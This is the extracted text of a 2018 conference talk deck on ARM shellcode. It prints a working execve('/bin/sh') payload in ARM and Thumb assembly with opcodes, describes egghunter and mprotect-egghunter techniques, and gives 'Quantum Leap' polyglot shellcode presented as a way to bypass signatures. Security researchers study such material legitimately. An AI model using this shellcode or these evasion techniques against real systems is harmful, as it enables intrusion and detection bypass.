Make ARM Shellcode Great Again

#HITB2018PEK
NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

# who am i
CEO Net-square. · Hacker, Speaker, Trainer,
Author. · M.S. Computer Science
Purdue University.
· LinkedIn: saumilshah · Twitter: @therealsaumil

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

Agenda
· A background on ARM shellcode · My research around ARM shellcode
­ cache coherency (solved before) ­ space limitations - ARM mprotect Egghunter ­ polyglot tricks - ARM Quantum Leap shellcode
· Demos

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

Example: ARM execve() Shellcode

.section .text .global _start _start:

Switch to Thumb mode: branch pc
+ 1

.code 32

add

r1, pc, #1

bx

r1

.code 16

adr

r0, SHELL

eor

r1, r1, r1

eor

r2, r2, r2

strb r2, [r0, #7]

mov

r7, #11

svc

#1

.balign 4 SHELL: .ascii "/bin/shX"

ARM CODE 00: e28f1001 add 04: e12fff11 bx

r1, pc, #1 r1

THUMB CODE 08: a002 0a: 4049 0c: 4052 0e: 71c2 10: 270b 12: df01

add eors eors strb movs svc

r0, pc, #8 r1, r1 r2, r2 r2, [r0, #7] r7, #11 1

LITERAL POOL 14: 6e69622f 18: 5868732f

.word 0x6e69622f .word 0x5868732f

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

Shellcode in tight spaces

Binary
heap
Lib Lib

· What if payload exceeds size "constraints"?
­ Overwrite local variables. ­ Bottom of the stack.
· Many solutions.

overflow
ROP
sphoelilnctoedre
shellcode shellcode
NETSQUARE

stack
SEGFAULT! SEGFAULT!

#HITB2018PEK

(c) SAUMIL SHAH

Egghunter
· Searches for an EGG (4+4 byte value) in the process memory.
· Uses syscalls to determine whether a memory page exists or not (safely).
· Upon finding it, Egghunter transfers the control to the code following the EGG.
· Nothing new here - done before.

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

Egghunter

Binary
heap
HACK HACK shellcode shellcode shellcode
Lib Lib

overflow ROP
egghunter

stack

gef> vmmap

Start

End

Perm Path

0x00008000 0x00009000 rw- /home/pi/eggbreak

0x00010000 0x00011000 rw- /home/pi/emgegmborryepaakge not

0x00011000 0x00032000 rw- [heap]

executable

0xb6e9c000 0xb6fbe000 r-x /lib/arm-linux-gnueabihf/libc-2.13.so

0xb6fbe000 0xb6fc5000 --- /lib/arm-linux-gnueabihf/libc-2.13.so

0xb6fc5000 0xb6fc7000 r-- /lib/arm-linux-gnueabihf/libc-2.13.so

0xb6fc7000 0xb6fc8000 rw- /lib/arm-linux-gnueabihf/libc-2.13.so

0xb6fc8000 0xb6fcb000 rw-

0xb6fd8000 0xb6ff5000 r-x /lib/arm-linux-gnueabihf/ld-2.13.so

0xb6ffa000 0xb6ffd000 rw-

0xb6ffd000 0xb6ffe000 r-- /lib/arm-linux-gnueabihf/ld-2.13.so

0xb6ffe000 0xb6fff000 rw- /lib/arm-linux-gnueabihf/ld-2.13.so

0xb6fff000 0xb7000000 r-x [sigpage]

0xbefdf000 0xbeffe000 rw-

0xbeffe000 0xbf000000 rwx [stack]

RWX - by ROP chain
Search for HACK+HACK one page at a time.

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

Egghunter - DEP
· If EGG+shellcode is in a different memory region, then it may not be executable
­ Overflow in the stack ­ Shellcode in the heap
· Enter the mprotect egghunter!

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

mprotect Egghunter

Binary

RWX RWX

heap

RWX

RWX

gef> vmmap

Start

End

Perm Path

HACK HACK shellcode shellcode shellcode

0x00008000 0x00009000 rwx /home/pi/eggbreak 0x00010000 0x00011000 rwx /home/pi/eggbreak 0x00011000 0x00012000 rwx [heap]

0x00012000 0x00032000 rw- [heap]

0xb6e9c000 0xb6fbe000 r-x /lib/arm-linux-gnueabihf/libc-2.13.so

Lib

0xb6fbe000 0xb6fc5000 --- /lib/arm-linux-gnueabihf/libc-2.13.so

0xb6fc5000 0xb6fc7000 r-- /lib/arm-linux-gnueabihf/libc-2.13.so

0xb6fc7000 0xb6fc8000 rw- /lib/arm-linux-gnueabihf/libc-2.13.so

Lib

0xb6fc8000 0xb6fcb000 rw-

0xb6fd8000 0xb6ff5000 r-x /lib/arm-linux-gnueabihf/ld-2.13.so

0xb6ffa000 0xb6ffd000 rw-

0xb6ffd000 0xb6ffe000 r-- /lib/arm-linux-gnueabihf/ld-2.13.so

overflow

stack

0xb6ffe000 0xb6fff000 rw- /lib/arm-linux-gnueabihf/ld-2.13.so 0xb6fff000 0xb7000000 r-x [sigpage] 0xbefdf000 0xbeffe000 rw-

0xbeffe000 0xbf000000 rwx [stack]

ROP

RWX

mprotect egghunter

RWX

RWX

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

mprotect Egghunter

NETSQUARE

DEMO #HITB2018PEK

(c) SAUMIL SHAH

Example: ARM execve() Shellcode

.section .text .global _start _start:

Switch to Thumb mode: branch pc
+ 1

.code 32

add

r1, pc, #1

bx

r1

.code 16

adr

r0, SHELL

eor

r1, r1, r1

eor

r2, r2, r2

strb r2, [r0, #7]

mov

r7, #11

svc

#1

.balign 4 SHELL: .ascii "/bin/shX"

· Mostly begins with an ARM-to-Thumb mode switch.
· Rest of the shellcode implemented in Thumb mode.
· Compact, avoids bad characters, etc.

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

Some Concerns / Arguments

· The "I can signature this" debate.
­ YARA Rules, IDS, Bro, blah blah...

· What if our target runs on a Thumb-only processor?
­ for example: Cortex-M

One Shellcode To Run Them All !

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

"Quantum Leap" Shellcode

Start in ARM mode "LEAP" TO THUMB
THUMB shellcode (execve, reverse, ...)

QUANTUM LEAP
Same Same But Different

Start in THUMB mode PASS THROUGH PASS THROUGH PASS THROUGH
THUMB shellcode (execve, reverse, ...)

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

"Quantum Leap" - what we need

· An understanding of ARM and Thumb instruction encoding:
­ ARM instruction: "DO SOMETHING" ­ 2 THUMB instructions: "PASS THROUGH"
· Conditional Execution in ARM instructions
­ very helpful!
· A little bit of luck and perseverance. · Nomenclature Credit: "dialup" @44CON.

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

The ARM to Thumb switch

ORIGINAL ARM CODE 0: e28f1001 add r1, pc, #1

4: e12fff11 bx r1

8: 270b a: beff

movs r7, #11 bkpt 0x00ff

"THUMB VIEW"

0: 1001

asrs r1, r0, #32

2: e28f

b.n 524

4: ff11 e12f vrhadd.u16 d14,d1,d31

8: 270b a: beff

movs r7, #11 bkpt 0x00ff

· Avoid "destructive" instructions
­ Branches, Load/Store, Floating Point, etc.
· Should work on ARMv6 (no Thumb2) · Avoid Illegal instructions.

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

ARM and THUMB decoding - 1

4 BYTE ARM INSTRUCTION - add r1, pc, #1

conditional

immediateopcode status

operand 1

destination

operand 2

e28f1001 1110 0010 1000 1111 0001 0000 0000 0001 add

r1,pc,#1

Thumb instruction 2
· Controlled by ARM Opcode and conditional flags.
· Part influenced by Operand 1 (ARM).
· Trickier to control.
NETSQUARE

Thumb instruction 1
· Controlled by Destination and Operand 2 of the ARM instruction.
· Easier to control.
#HITB2018PEK

(c) SAUMIL SHAH

ARM and THUMB decoding - 1

1 ARM INSTRUCTION RESULTING INTO 2 THUMB INSTRUCTIONS:

conditional

immediateopcode status

operand 1

destination

operand 2

e28f1001 1110 0010 1000 1111 0001 0000 0000 0001 add

r1,pc,#1

1001

0001 0000 0000 0001 asrs r1,r0,#32

e28f

1110 0010 1000 1111

b

524

Thumb Opcode 2 influenced by ARM
conditional bits

Thumb Opcode 1 influenced by ARM destination operand

Branch instructions are destructive

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

(Un)conditional Instructions

· How can we turn an ARM instruction into a conditional instruction...
· ...with guaranteed execution everytime? · COMPLIMENTARY CONDITIONS.

UNCONDITIONAL INSTRUCTION e28f1001 add r1, pc, #1

COMPLIMENTARY CONDITIONS
128f1005 addne r1, pc, #5 028f1001 addeq r1, pc, #1

· One of the instructions is guaranteed to execute, irrespective of condition flags.

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

ARM and THUMB decoding - 2

USING CONDITIONAL ARM INSTRUCTIONS:

conditional

immediateopcode status

operand 1

destination

operand 2

128f1005: 0001 0010 1000 1111 0001 0000 0000 0101 addne r1,pc,#5

1005:

0001 0000 0000 0101 asrs r5,r0,#32

128f:

0001 0010 1000 1111

asrs r7,r1,#10

028f1001: 0000 0010 1000 1111 0001 0000 0000 0001 addeq r1,pc,#1

1001:

0001 0000 0000 0001 asrs r1,r0,#32

028f:

0000 0010 1000 1111

lsls r7,r1,#10

Complimentary Conditional ARM
instructions
NETSQUARE

#HITB2018PEK

No destructive instructions in Thumb mode

(c) SAUMIL SHAH

Final "Quantum Leap" Code

QUANTUM LEAP: ARM TO THUMB 0: 228fa019 addcs sl, pc, #25

4: 328fa015 addcc sl, pc, #21

8: 21a0400d movcs r4, sp

c: 31a0400d movcc r4, sp

10: 292d0412 pushcs {r1, r4, sl}

14: 392d0412 pushcc {r1, r4, sl}

18: 28bda002 popcs {r1, sp, pc}

1c: 38bda002 popcc {r1, sp, pc}

20: beff 22: beff

bkpt 0x00ff bkpt 0x00ff

QUANTUM LEAP: PASS THROUGH (THUMB)

0: a019 2: 228f 4: a015 6: 328f 8: 400d a: 21a0 c: 400d e: 31a0 10: 0412 12: 292d 14: 0412 16: 392d 18: a002 1a: 28bd 1c: a002 1e: 38bd 20: beff 20: beff

add movs add adds ands movs ands adds lsls cmp lsls subs add cmp add subs bkpt bkpt

r0, pc, #100 r2, #143 r0, pc, #84 r2, #143 r5, r1 r1, #160 r5, r1 r1, #160 r2, r2, #16 r1, #45 r2, r2, #16 r1, #45 r0, pc, #8 r0, #189 r0, pc, #8 r0, #189 0x00ff 0x00ff

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

Assembling the Quantum Leap

· No Thumb2 instructions. · No NULL bytes. · Took many iterations to finalise! · bx sl implemented by push {sl}, pop {pc}. · Register list proved to be a challenge. · Registers r4, sl altered in ARM. · Registers r0, r1, r2, r5 altered in Thumb.

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

QUANTUM LEAP SHELLCODE

NETSQUARE

DEMO #HITB2018PEK

(c) SAUMIL SHAH

Conclusion
· ARM/Thumb Polyglot instructions and conditional execution offer many opportunities for obfuscation and signature bypass.
· Lots of exploration opportunities in ARM shellcoding.

https://github.com/therealsaumil/arm_shellcode

NETSQUARE

#HITB2018PEK

(c) SAUMIL SHAH

exit(0)

#HITB2018PEK
NETSQUARE

Saumil Shah @therealsaumil

#HITB2018PEK

(c) SAUMIL SHAH

